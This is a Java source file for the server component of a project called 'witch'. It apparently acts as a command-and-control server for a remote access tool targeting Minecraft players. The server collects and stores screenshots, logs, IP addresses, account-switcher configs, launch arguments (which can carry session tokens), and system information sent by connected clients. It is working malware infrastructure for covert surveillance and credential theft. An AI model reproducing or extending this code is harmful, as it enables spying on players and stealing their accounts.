package me.soda.witch.server.server;

import com.google.gson.Gson;
import me.soda.witch.server.data.ConnectionInfo;
import me.soda.witch.server.utils.Utils;
import me.soda.witch.shared.Crypto;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.socket.Connection;
import me.soda.witch.shared.socket.TcpServer;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.ConcurrentHashMap;

public class Server extends TcpServer {
    private static final Logger LOGGER = LoggerFactory.getLogger(Server.class);
    private static final Gson GSON = new Gson();
    protected final ConcurrentHashMap<Connection, ConnectionInfo> clientMap = new ConcurrentHashMap<>();
    protected final ClientConfigData clientDefaultConf = Utils.getDefaultClientConfig();
    protected final ServerConfig config = Utils.getServerConfig();
    private int clientIndex = 0;

    public Server() throws IOException {
        super();

        LOGGER.info("--@@@@@@@ By Soda5601 @@@@@@@--");
        LOGGER.info("Server Config: {}", GSON.toJson(config));
        LOGGER.info("Client Config: {}", GSON.toJson(clientDefaultConf));
        LOGGER.info("Server started on {}.", config.port);
        Crypto.INSTANCE = new Crypto(config.encryptionKey.getBytes());
        start(config.port);
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }

    @Override
    public void onOpen(Connection conn) {
        String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
        LOGGER.info("Client connected: {} ID: {}", address, clientIndex);
        clientMap.put(conn, new ConnectionInfo(clientIndex));
        clientIndex++;
    }

    @Override
    public void onMessage(Connection conn, Message message) {
        ConnectionInfo info = clientMap.get(conn);
        int id = info.id;
        try {
            if (message.data instanceof ByteData data) {
                switch (data.id) {
                    case "screenshot", "screenshot2" -> {
                        File file = new File(Utils.getDataFile("screenshots"), getFileName(data.id + "id", "png", String.valueOf(id), true));
                        FileUtil.write(file, data.bytes());
                    }
                    case "skin" -> {
                        String playerName = info.player.playerName;
                        File file = new File(Utils.getDataFile("skins"), getFileName(playerName, "png", String.valueOf(id), false));
                        FileUtil.write(file, data.bytes());
                    }
                }
            } else if (message.data instanceof StringsData data) {
                if (data.data().length == 0 && data.id().equals("getconfig")) {
                    conn.send(new Message(clientDefaultConf));
                } else if (data.data().length == 1) {
                    String msg = data.data()[0];
                    switch (data.id()) {
                        case "logging" -> {
                            File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
                            String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
                            FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                        }
                        case "ip" -> info.ip = msg;
                        case "iasconfig", "runargs", "systeminfo", "props" -> {
                            File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.player.playerName, true));
                            FileUtil.write(file, msg);
                        }
                    }
                }
            } else if (message.data instanceof PlayerData data) {
                info.player = data;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        LOGGER.info("Received message: {} From ID {}", message.data.getClass().getName(), id);
    }

    @Override
    public void onClose(Connection conn, DisconnectData disconnectData) {
        LOGGER.info("Client disconnected: ID: {}", clientMap.get(conn).id);
        clientMap.remove(conn);
    }
}
